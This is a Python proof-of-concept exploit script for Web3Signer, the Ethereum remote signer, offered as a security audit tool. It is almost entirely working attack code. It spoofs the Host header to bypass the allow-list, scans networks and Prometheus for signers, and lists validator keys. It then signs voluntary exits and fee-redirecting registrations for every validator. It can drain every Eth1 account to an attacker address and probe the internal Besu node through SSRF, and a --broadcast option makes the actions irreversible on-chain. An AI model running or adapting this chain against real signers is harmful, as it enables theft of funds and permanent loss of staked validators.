#!/usr/bin/env python3
"""
Web3Signer Signing Oracle — Full Chain PoC
===========================================
Demonstrates the complete exploit chain: three gaps → signing oracle → total asset compromise.

Gap 1: HostAllowListHandler.java:50 reads Host header (client-controlled), not remoteAddress()
Gap 2: Runner.java:128-155 has zero auth middleware after host check
Gap 3: Eth2SignForIdentifierHandler.java:196 — default -> return true (slashing protection bypass)

Chain:
  TCP connect → Host: localhost (bypass Gap 1)
  → enumerate keys (no auth, Gap 2)
  → sign anything (Gap 2 + Gap 3)
  → broadcast on-chain (irreversible damage)

Usage:
  # Discover Web3Signer instances from an adjacent host (scan local network)
  python3 poc_signing_oracle.py --discover --cidr 10.0.0.0/24

  # Discover via known Prometheus (reads targets to find Web3Signer)
  python3 poc_signing_oracle.py --discover --prometheus http://prometheus:9090

  # Dry run (default) — enumerates keys and signs, but does NOT broadcast anything on-chain
  python3 poc_signing_oracle.py --target <HOST>:<PORT>

  # With beacon node broadcast (actually submits voluntary exits — DESTRUCTIVE)
  python3 poc_signing_oracle.py --target <HOST>:<PORT> --beacon-node <BEACON_URL> --broadcast

  # Eth1 drain (actually sends transactions — DESTRUCTIVE)
  python3 poc_signing_oracle.py --target <HOST>:<PORT> --drain-to <ATTACKER_ADDRESS> --broadcast

IMPORTANT: This is a security audit tool. Only use against systems you are authorized to test.
"""

import argparse
import ipaddress
import json
import socket
import sys
import time
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional


# ---------------------------------------------------------------------------
# Core HTTP helper — every request spoofs Host: localhost (Gap 1 bypass)
# ---------------------------------------------------------------------------

def req(target: str, method: str, path: str, body: dict | str | None = None,
        accept_json: bool = True) -> tuple[int, str]:
    """Send an HTTP request with Host: localhost to bypass HostAllowListHandler."""
    url = f"http://{target}{path}"
    data = None
    if body is not None:
        data = (json.dumps(body) if isinstance(body, dict) else body).encode("utf-8")

    headers = {
        "Host": "localhost",                          # Gap 1: bypass HostAllowListHandler
        "Content-Type": "application/json",
    }
    if accept_json:
        headers["Accept"] = "application/json"

    request = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(request, timeout=10) as resp:
            return resp.status, resp.read().decode("utf-8")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8") if e.fp else ""
    except Exception as e:
        return 0, str(e)


def jsonrpc(target: str, method: str, params=None, rpc_id: int = 1) -> tuple[int, dict]:
    """Send a JSON-RPC 2.0 call (Eth1 mode) through the root path."""
    body = {"jsonrpc": "2.0", "method": method, "params": params or [], "id": rpc_id}
    status, text = req(target, "POST", "/", body)
    try:
        return status, json.loads(text)
    except json.JSONDecodeError:
        return status, {"error": text}


# ---------------------------------------------------------------------------
# Data classes for collected results
# ---------------------------------------------------------------------------

@dataclass
class SignedVoluntaryExit:
    pubkey: str
    validator_index: str
    epoch: str
    signature: str

@dataclass
class SignedValidatorRegistration:
    pubkey: str
    fee_recipient: str
    signature: str

@dataclass
class SignedTransaction:
    from_address: str
    to_address: str
    status: int
    response: str

@dataclass
class Results:
    mode: str = "unknown"
    eth2_pubkeys: list[str] = field(default_factory=list)
    eth1_accounts: list[str] = field(default_factory=list)
    voluntary_exits: list[SignedVoluntaryExit] = field(default_factory=list)
    validator_registrations: list[SignedValidatorRegistration] = field(default_factory=list)
    eth1_transactions: list[SignedTransaction] = field(default_factory=list)
    ssrf_results: dict = field(default_factory=dict)


# ---------------------------------------------------------------------------
# Discovery: Find Web3Signer instances on the network
# ---------------------------------------------------------------------------

def discover_via_scan(cidr: str, port: int = 9000, threads: int = 50) -> list[str]:
    """
    Scan a CIDR range for Web3Signer instances by hitting /upcheck with Host: localhost.
    This is what an attacker does after pivoting into the internal network
    (e.g., from a compromised monitoring pod, beacon node, or any adjacent service).
    """
    print(f"\n[Discover] Scanning {cidr} port {port} for Web3Signer instances...")
    network = ipaddress.ip_network(cidr, strict=False)
    found = []

    def check_host(ip: str) -> Optional[str]:
        target = f"{ip}:{port}"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result != 0:
                return None
            status, body = req(target, "GET", "/upcheck")
            if status == 200:
                return target
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_host, str(ip)): str(ip) for ip in network.hosts()}
        for future in as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
                print(f"  [+] FOUND Web3Signer at {result}")

    if not found:
        print(f"  [-] No Web3Signer instances found in {cidr}")
    else:
        print(f"  [+] Total found: {len(found)}")

    return found


def discover_via_prometheus(prometheus_url: str) -> list[str]:
    """
    Query a Prometheus instance to find Web3Signer targets.
    Prometheus scrapes Web3Signer metrics (port 9001, also bound to 0.0.0.0).
    The targets config reveals the internal hostname/IP of the signer.
    Attack path: compromised Grafana/monitoring → read Prometheus targets → find signer.
    """
    print(f"\n[Discover] Querying Prometheus at {prometheus_url} for Web3Signer targets...")
    found = []

    try:
        # Query Prometheus targets API
        targets_url = f"{prometheus_url}/api/v1/targets"
        request = urllib.request.Request(targets_url, headers={"Host": "localhost"})
        with urllib.request.urlopen(request, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8"))

        active_targets = data.get("data", {}).get("activeTargets", [])
        for target in active_targets:
            labels = target.get("labels", {})
            address = target.get("scrapeUrl", "")
            job = labels.get("job", "")

            # Look for Web3Signer metrics targets (common job names)
            if any(kw in job.lower() for kw in ["web3signer", "signer", "w3s"]):
                print(f"  [+] Prometheus target: job={job} address={address}")
                # Extract hostname, replace metrics port (9001) with signing port (9000)
                try:
                    from urllib.parse import urlparse
                    parsed = urlparse(address)
                    host = parsed.hostname
                    signer_target = f"{host}:9000"
                    # Verify it's actually a Web3Signer
                    status, body = req(signer_target, "GET", "/upcheck")
                    if status == 200:
                        found.append(signer_target)
                        print(f"  [+] CONFIRMED Web3Signer at {signer_target}")
                except Exception:
                    pass

        # Also search for web3signer in metric names
        if not found:
            series_url = f"{prometheus_url}/api/v1/label/__name__/values"
            request = urllib.request.Request(series_url, headers={"Host": "localhost"})
            with urllib.request.urlopen(request, timeout=5) as resp:
                metrics = json.loads(resp.read().decode("utf-8"))
            signer_metrics = [m for m in metrics.get("data", [])
                            if "signing" in m.lower() or "web3signer" in m.lower()]
            if signer_metrics:
                print(f"  [*] Found signer-related metrics: {signer_metrics[:5]}")
                print(f"      Web3Signer exists in this monitoring stack — scan the network to find it")

    except Exception as e:
        print(f"  [-] Prometheus query failed: {e}")

    return found


def discover_via_dns(base_names: list[str] = None, port: int = 9000) -> list[str]:
    """
    Try common internal DNS names for Web3Signer in k8s/docker environments.
    In k8s, services get DNS names like: web3signer.namespace.svc.cluster.local
    """
    if base_names is None:
        base_names = [
            "web3signer",
            "web3-signer",
            "signer",
            "eth2-signer",
            "validator-signer",
            "web3signer.default",
            "web3signer.staking",
            "web3signer.ethereum",
            "web3signer.validators",
            "web3signer.default.svc.cluster.local",
            "web3signer.staking.svc.cluster.local",
        ]

    print(f"\n[Discover] Trying common DNS names for Web3Signer...")
    found = []

    for name in base_names:
        try:
            ip = socket.gethostbyname(name)
            target = f"{name}:{port}"
            status, body = req(target, "GET", "/upcheck")
            if status == 200:
                found.append(target)
                print(f"  [+] FOUND: {name} → {ip}:{port}")
            else:
                print(f"  [-] {name} → {ip} (port {port} returned {status})")
        except socket.gaierror:
            pass  # DNS name doesn't resolve — expected for most names
        except Exception:
            pass

    if not found:
        print(f"  [-] No DNS names resolved to a Web3Signer instance")

    return found


# ---------------------------------------------------------------------------
# Step 0: Verify reachability + bypass HostAllowListHandler
# ---------------------------------------------------------------------------

def step0_verify_bypass(target: str) -> bool:
    """Verify we can reach the signer and bypass the host allowlist."""
    print("\n[Step 0] Verifying target reachability and host allowlist bypass...")

    status, body = req(target, "GET", "/upcheck")
    if status == 200:
        print(f"  [+] Host allowlist BYPASSED — /upcheck returned {status}: {body.strip()}")
        print(f"      HostAllowListHandler.java:36 accepted Host: localhost from our IP")
        return True

    # Try without Host spoofing to confirm the allowlist is what blocks us
    print(f"  [-] /upcheck returned {status} — target may not be reachable")
    return False


# ---------------------------------------------------------------------------
# Step 1: Detect mode and enumerate all keys
# ---------------------------------------------------------------------------

def step1_enumerate_keys(target: str, results: Results) -> bool:
    """Enumerate all loaded keys. Auto-detect eth1 vs eth2 mode."""
    print("\n[Step 1] Enumerating all loaded keys (no auth required — Gap 2)...")

    # Try Eth2 endpoint
    status, body = req(target, "GET", "/api/v1/eth2/publicKeys")
    if status == 200:
        try:
            keys = json.loads(body)
            if isinstance(keys, list) and len(keys) > 0:
                results.mode = "eth2"
                results.eth2_pubkeys = keys
                print(f"  [+] Eth2 mode detected — {len(keys)} validator public keys loaded:")
                for k in keys[:5]:
                    print(f"      {k[:20]}...{k[-8:]}")
                if len(keys) > 5:
                    print(f"      ... and {len(keys) - 5} more")
                return True
        except json.JSONDecodeError:
            pass

    # Try Eth1 endpoint
    status, body = req(target, "GET", "/api/v1/eth1/publicKeys")
    if status == 200:
        try:
            keys = json.loads(body)
            if isinstance(keys, list) and len(keys) > 0:
                results.mode = "eth1"
                # Also get eth1 addresses via JSON-RPC
                rpc_status, rpc_resp = jsonrpc(target, "eth_accounts")
                if "result" in rpc_resp:
                    results.eth1_accounts = rpc_resp["result"]
                print(f"  [+] Eth1 mode detected — {len(keys)} secp256k1 keys loaded")
                print(f"      {len(results.eth1_accounts)} eth1 addresses available:")
                for addr in results.eth1_accounts[:5]:
                    print(f"      {addr}")
                if len(results.eth1_accounts) > 5:
                    print(f"      ... and {len(results.eth1_accounts) - 5} more")
                return True
        except json.JSONDecodeError:
            pass

    # Try both empty — might still be reachable but no keys loaded
    if status == 200:
        print(f"  [!] Signer reachable but no keys loaded (empty key list)")
        return False

    print(f"  [-] Could not enumerate keys (status={status})")
    return False


# ---------------------------------------------------------------------------
# Step 2A: Eth2 — Sign VOLUNTARY_EXIT for every validator
# ---------------------------------------------------------------------------

def step2a_sign_voluntary_exits(target: str, results: Results,
                                 fork_version: str, genesis_root: str,
                                 epoch: str, validator_indices: dict[str, str]):
    """
    Sign VOLUNTARY_EXIT for every validator.
    Code path: Eth2SignForIdentifierHandler.java:94 → :271-274 → :133-134 (sign)
               → :196-197 default->true (bypass slashing protection) → :152 return sig
    """
    print(f"\n[Step 2A] Signing VOLUNTARY_EXIT for {len(results.eth2_pubkeys)} validators...")
    print(f"         Eth2SignForIdentifierHandler.java:196 — default -> return true")

    for pubkey in results.eth2_pubkeys:
        # Validator index — in real attack this comes from beacon chain (public data)
        # For the PoC, we accept a mapping or use a placeholder
        v_index = validator_indices.get(pubkey, "0")

        body = {
            "type": "VOLUNTARY_EXIT",
            "fork_info": {
                "fork": {
                    "previous_version": fork_version,
                    "current_version": fork_version,
                    "epoch": epoch
                },
                "genesis_validators_root": genesis_root
            },
            "voluntary_exit": {
                "epoch": epoch,
                "validator_index": v_index
            }
        }

        status, resp_text = req(target, "POST", f"/api/v1/eth2/sign/{pubkey}", body)

        if status == 200:
            try:
                sig = json.loads(resp_text).get("signature", resp_text.strip())
            except json.JSONDecodeError:
                sig = resp_text.strip()

            results.voluntary_exits.append(SignedVoluntaryExit(
                pubkey=pubkey, validator_index=v_index, epoch=epoch, signature=sig
            ))
            print(f"  [+] SIGNED exit for validator {v_index} ({pubkey[:16]}...)")
            print(f"      sig: {sig[:32]}...")
        else:
            print(f"  [-] Failed for {pubkey[:16]}... — status={status}: {resp_text[:80]}")


# ---------------------------------------------------------------------------
# Step 2B: Eth2 — Sign VALIDATOR_REGISTRATION to redirect fees
# ---------------------------------------------------------------------------

def step2b_sign_validator_registrations(target: str, results: Results,
                                         attacker_fee_recipient: str):
    """
    Sign VALIDATOR_REGISTRATION with attacker's fee_recipient for every validator.
    Code path: Eth2SignForIdentifierHandler.java:316-320 (no fork_info needed)
               → :133-134 (sign) → :196-197 default->true → :152 return sig
    """
    print(f"\n[Step 2B] Signing VALIDATOR_REGISTRATION for {len(results.eth2_pubkeys)} validators...")
    print(f"         fee_recipient → {attacker_fee_recipient}")

    timestamp = str(int(time.time()))

    for pubkey in results.eth2_pubkeys:
        body = {
            "type": "VALIDATOR_REGISTRATION",
            "validator_registration": {
                "fee_recipient": attacker_fee_recipient,
                "gas_limit": "30000000",
                "timestamp": timestamp,
                "pubkey": pubkey
            }
        }

        status, resp_text = req(target, "POST", f"/api/v1/eth2/sign/{pubkey}", body)

        if status == 200:
            try:
                sig = json.loads(resp_text).get("signature", resp_text.strip())
            except json.JSONDecodeError:
                sig = resp_text.strip()

            results.validator_registrations.append(SignedValidatorRegistration(
                pubkey=pubkey, fee_recipient=attacker_fee_recipient, signature=sig
            ))
            print(f"  [+] SIGNED registration for {pubkey[:16]}... → {attacker_fee_recipient}")
            print(f"      sig: {sig[:32]}...")
        else:
            print(f"  [-] Failed for {pubkey[:16]}... — status={status}: {resp_text[:80]}")


# ---------------------------------------------------------------------------
# Step 2C: Eth1 — Drain every account via eth_sendTransaction
# ---------------------------------------------------------------------------

def step2c_drain_eth1_accounts(target: str, results: Results,
                                attacker_address: str, broadcast: bool):
    """
    Drain every loaded Eth1 account via eth_sendTransaction.
    Code path: SendTransactionHandler.java:62 (create tx) → :78 (signer available)
               → :85 (sendTransaction) → TransactionSerializer.java:98 (sign)
               → TransactionTransmitter.java:116 (forward to Besu → broadcast)
    """
    print(f"\n[Step 2C] {'DRAINING' if broadcast else 'Simulating drain of'} "
          f"{len(results.eth1_accounts)} Eth1 accounts...")
    if not broadcast:
        print(f"         (--broadcast not set — will only test signing, not submit tx)")

    for addr in results.eth1_accounts:
        if broadcast:
            # eth_sendTransaction: signs AND broadcasts in one call
            params = [{
                "from": addr,
                "to": attacker_address,
                "value": "0xDE0B6B3A7640000",  # 1 ETH — in real attack, query balance first
                "gas": "0x5208",
                "gasPrice": "0x3B9ACA00"
            }]
            status, resp = jsonrpc(target, "eth_sendTransaction", params)
            tx_hash = resp.get("result", str(resp))
            results.eth1_transactions.append(SignedTransaction(
                from_address=addr, to_address=attacker_address,
                status=status, response=tx_hash
            ))
            print(f"  [+] SENT tx from {addr} → {attacker_address}")
            print(f"      tx hash: {tx_hash}")
        else:
            # Dry run: use eth_sign to prove signing access without broadcasting
            status, resp = jsonrpc(target, "eth_sign", [addr, "0xdeadbeef"])
            sig = resp.get("result", str(resp))
            if status == 200 and "result" in resp:
                results.eth1_transactions.append(SignedTransaction(
                    from_address=addr, to_address="(dry run — eth_sign)",
                    status=status, response=sig
                ))
                print(f"  [+] SIGNED data with {addr} (eth_sign proof — no tx broadcast)")
                print(f"      sig: {str(sig)[:40]}...")
            else:
                print(f"  [-] eth_sign failed for {addr}: status={status} resp={str(resp)[:80]}")


# ---------------------------------------------------------------------------
# Step 3: SSRF probe via PassThroughHandler (Eth1 mode)
# ---------------------------------------------------------------------------

def step3_ssrf_probe(target: str, results: Results):
    """
    Probe internal Besu node through PassThroughHandler.
    Code path: PassThroughHandler.java:56-62 — forwards ANY JSON-RPC method
               to the downstream Besu node configured in Eth1Runner.
    """
    print("\n[Step 3] Probing internal Besu node via SSRF (PassThroughHandler)...")

    probe_methods = [
        ("net_version", []),
        ("eth_chainId", []),
        ("eth_blockNumber", []),
        ("admin_peers", []),
        ("admin_nodeInfo", []),
        ("txpool_status", []),
        ("debug_metrics", []),
    ]

    for method, params in probe_methods:
        status, resp = jsonrpc(target, method, params)
        result = resp.get("result", resp.get("error", "no response"))
        accessible = status == 200 and "result" in resp
        results.ssrf_results[method] = {"accessible": accessible, "result": str(result)[:120]}
        marker = "[+]" if accessible else "[-]"
        print(f"  {marker} {method}: {str(result)[:80]}")


# ---------------------------------------------------------------------------
# Step 4: Broadcast to beacon chain (only if --broadcast)
# ---------------------------------------------------------------------------

def step4_broadcast_exits(results: Results, beacon_node: str):
    """
    Broadcast signed voluntary exits to the beacon chain.
    This is the final link: signed artifact → on-chain irreversible action.
    """
    print(f"\n[Step 4] Broadcasting {len(results.voluntary_exits)} voluntary exits to {beacon_node}...")

    for exit_data in results.voluntary_exits:
        body = json.dumps({
            "message": {
                "epoch": exit_data.epoch,
                "validator_index": exit_data.validator_index
            },
            "signature": exit_data.signature
        }).encode("utf-8")

        url = f"{beacon_node}/eth/v1/beacon/pool/voluntary_exits"
        request = urllib.request.Request(url, data=body, method="POST",
                                          headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(request, timeout=10) as resp:
                print(f"  [+] EXIT BROADCAST for validator {exit_data.validator_index}: "
                      f"status={resp.status}")
        except urllib.error.HTTPError as e:
            print(f"  [-] Broadcast failed for validator {exit_data.validator_index}: "
                  f"status={e.code} {e.read().decode()[:80]}")
        except Exception as e:
            print(f"  [-] Broadcast failed: {e}")


# ---------------------------------------------------------------------------
# Output collected results
# ---------------------------------------------------------------------------

def output_results(results: Results, output_file: Optional[str]):
    """Dump all collected signed artifacts to JSON."""
    data = {
        "mode": results.mode,
        "summary": {
            "eth2_validators_compromised": len(results.eth2_pubkeys),
            "eth1_accounts_compromised": len(results.eth1_accounts),
            "voluntary_exits_signed": len(results.voluntary_exits),
            "validator_registrations_signed": len(results.validator_registrations),
            "eth1_transactions": len(results.eth1_transactions),
            "ssrf_methods_accessible": sum(1 for v in results.ssrf_results.values() if v["accessible"]),
        },
        "voluntary_exits": [
            {"pubkey": e.pubkey, "validator_index": e.validator_index,
             "epoch": e.epoch, "signature": e.signature}
            for e in results.voluntary_exits
        ],
        "validator_registrations": [
            {"pubkey": r.pubkey, "fee_recipient": r.fee_recipient, "signature": r.signature}
            for r in results.validator_registrations
        ],
        "eth1_transactions": [
            {"from": t.from_address, "to": t.to_address,
             "status": t.status, "response": t.response}
            for t in results.eth1_transactions
        ],
        "ssrf_results": results.ssrf_results,
    }

    json_output = json.dumps(data, indent=2)

    if output_file:
        with open(output_file, "w") as f:
            f.write(json_output)
        print(f"\n[*] Full results written to {output_file}")
    else:
        print(f"\n{'='*70}")
        print(json_output)


# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

def print_summary(results: Results, broadcast: bool):
    print(f"\n{'='*70}")
    print(f"CHAIN RESULT SUMMARY")
    print(f"{'='*70}")
    print(f"  Mode:                          {results.mode}")
    print(f"  Keys enumerated:               {len(results.eth2_pubkeys) + len(results.eth1_accounts)}")

    if results.mode == "eth2":
        print(f"  Voluntary exits signed:        {len(results.voluntary_exits)}")
        print(f"  Validator registrations signed: {len(results.validator_registrations)}")
        if results.voluntary_exits:
            print(f"\n  IMPACT (Eth2):")
            print(f"    {len(results.voluntary_exits)} validators can be permanently exited")
            print(f"    {len(results.voluntary_exits) * 32} ETH of staked capital at risk")
            print(f"    All MEV revenue redirectable to attacker")
            if not broadcast:
                print(f"\n    (Dry run — no exits broadcast. Use --broadcast --beacon-node to execute.)")

    if results.mode == "eth1":
        print(f"  Eth1 signing proofs:           {len(results.eth1_transactions)}")
        accessible = sum(1 for v in results.ssrf_results.values() if v["accessible"])
        print(f"  Besu SSRF methods accessible:  {accessible}/{len(results.ssrf_results)}")
        if results.eth1_transactions:
            print(f"\n  IMPACT (Eth1):")
            print(f"    {len(results.eth1_accounts)} accounts — attacker can drain ALL balances")
            print(f"    via eth_sendTransaction (signs + broadcasts in one call)")
            if not broadcast:
                print(f"\n    (Dry run — no transactions sent. Use --broadcast --drain-to to execute.)")

    print(f"{'='*70}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Web3Signer Signing Oracle — Full Chain PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Phase 0: Discover Web3Signer from inside the network
  python3 poc_signing_oracle.py --discover --cidr 10.0.0.0/24
  python3 poc_signing_oracle.py --discover --prometheus http://prometheus:9090
  python3 poc_signing_oracle.py --discover --dns

  # Dry run against a target (safe — no on-chain actions)
  python3 poc_signing_oracle.py --target 10.0.0.5:9000

  # Eth2: sign exits + registrations, output to file
  python3 poc_signing_oracle.py --target 10.0.0.5:9000 \\
    --fee-recipient 0xAttackerAddr --output results.json

  # Eth2: actually broadcast exits (DESTRUCTIVE)
  python3 poc_signing_oracle.py --target 10.0.0.5:9000 \\
    --beacon-node http://beacon:5052 --broadcast

  # Eth1: drain all accounts (DESTRUCTIVE)
  python3 poc_signing_oracle.py --target 10.0.0.5:9000 \\
    --drain-to 0xAttackerAddr --broadcast
""")
    # Discovery options
    parser.add_argument("--discover", action="store_true",
                        help="Discovery mode — find Web3Signer instances on the network")
    parser.add_argument("--cidr",
                        help="CIDR range to scan (e.g. 10.0.0.0/24)")
    parser.add_argument("--prometheus",
                        help="Prometheus URL to query for Web3Signer targets")
    parser.add_argument("--dns", action="store_true",
                        help="Try common k8s/docker DNS names for Web3Signer")
    # Target (required unless discovery mode)
    parser.add_argument("--target",
                        help="Web3Signer host:port (e.g. 10.0.0.5:9000)")
    parser.add_argument("--beacon-node",
                        help="Beacon node URL for broadcasting exits (e.g. http://beacon:5052)")
    parser.add_argument("--fee-recipient", default="0x" + "41" * 20,
                        help="Attacker fee recipient for VALIDATOR_REGISTRATION")
    parser.add_argument("--drain-to", default="0x" + "41" * 20,
                        help="Attacker address for Eth1 fund drainage")
    parser.add_argument("--fork-version", default="0x04000000",
                        help="Current fork version (from beacon chain, public)")
    parser.add_argument("--genesis-root",
                        default="0x4b363db94e286120d76eb905340fcd44b1338229ab27b4d6ba2578e7bbe7b7dc",
                        help="Genesis validators root (from beacon chain, public)")
    parser.add_argument("--epoch", default="300000",
                        help="Current epoch for voluntary exit")
    parser.add_argument("--broadcast", action="store_true",
                        help="Actually broadcast/execute (DESTRUCTIVE — exits validators / drains funds)")
    parser.add_argument("--output", help="Write JSON results to file")

    args = parser.parse_args()
    results = Results()

    print("=" * 70)
    print("Web3Signer Signing Oracle — Full Chain PoC")
    print("=" * 70)

    # -----------------------------------------------------------------------
    # Discovery mode: find Web3Signer instances
    # -----------------------------------------------------------------------
    if args.discover:
        targets = []
        if args.cidr:
            targets.extend(discover_via_scan(args.cidr))
        if args.prometheus:
            targets.extend(discover_via_prometheus(args.prometheus))
        if args.dns:
            targets.extend(discover_via_dns())
        if not args.cidr and not args.prometheus and not args.dns:
            # Default: try DNS first (free), then common subnets
            targets.extend(discover_via_dns())

        if targets:
            print(f"\n{'='*70}")
            print(f"DISCOVERED {len(targets)} Web3Signer INSTANCE(S):")
            for t in targets:
                print(f"  {t}")
            print(f"\nRe-run with: --target {targets[0]}")
            print(f"{'='*70}")
        else:
            print("\n[!] No instances found. Try --cidr with a wider range.")
        sys.exit(0)

    if not args.target:
        parser.error("--target is required (or use --discover to find instances)")

    print(f"Target:    {args.target}")
    print(f"Broadcast: {'YES — DESTRUCTIVE' if args.broadcast else 'No (dry run)'}")

    # -----------------------------------------------------------------------
    # Step 0: Verify we can bypass the host allowlist
    # -----------------------------------------------------------------------
    if not step0_verify_bypass(args.target):
        print("\n[!] Cannot reach target. Aborting.")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Step 1: Enumerate all keys
    # -----------------------------------------------------------------------
    if not step1_enumerate_keys(args.target, results):
        print("\n[!] No keys found. Signer may be empty or unreachable.")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Step 2: Sign everything — mode-dependent
    # -----------------------------------------------------------------------
    if results.mode == "eth2":
        # Build a placeholder validator_index mapping
        # In a real attack, these come from GET /eth/v1/beacon/states/head/validators
        # which is public beacon chain data
        validator_indices = {pk: str(i) for i, pk in enumerate(results.eth2_pubkeys)}

        # 2A: Sign VOLUNTARY_EXIT for every validator
        step2a_sign_voluntary_exits(
            args.target, results,
            fork_version=args.fork_version,
            genesis_root=args.genesis_root,
            epoch=args.epoch,
            validator_indices=validator_indices
        )

        # 2B: Sign VALIDATOR_REGISTRATION to redirect fees
        step2b_sign_validator_registrations(
            args.target, results,
            attacker_fee_recipient=args.fee_recipient
        )

    elif results.mode == "eth1":
        # 2C: Drain every Eth1 account
        step2c_drain_eth1_accounts(
            args.target, results,
            attacker_address=args.drain_to,
            broadcast=args.broadcast
        )

        # 3: SSRF probe via PassThroughHandler
        step3_ssrf_probe(args.target, results)

    # -----------------------------------------------------------------------
    # Step 4: Broadcast to beacon chain (Eth2 only, only if --broadcast)
    # -----------------------------------------------------------------------
    if results.mode == "eth2" and args.broadcast and args.beacon_node:
        step4_broadcast_exits(results, args.beacon_node)

    # -----------------------------------------------------------------------
    # Output
    # -----------------------------------------------------------------------
    output_results(results, args.output)
    print_summary(results, args.broadcast)


if __name__ == "__main__":
    main()
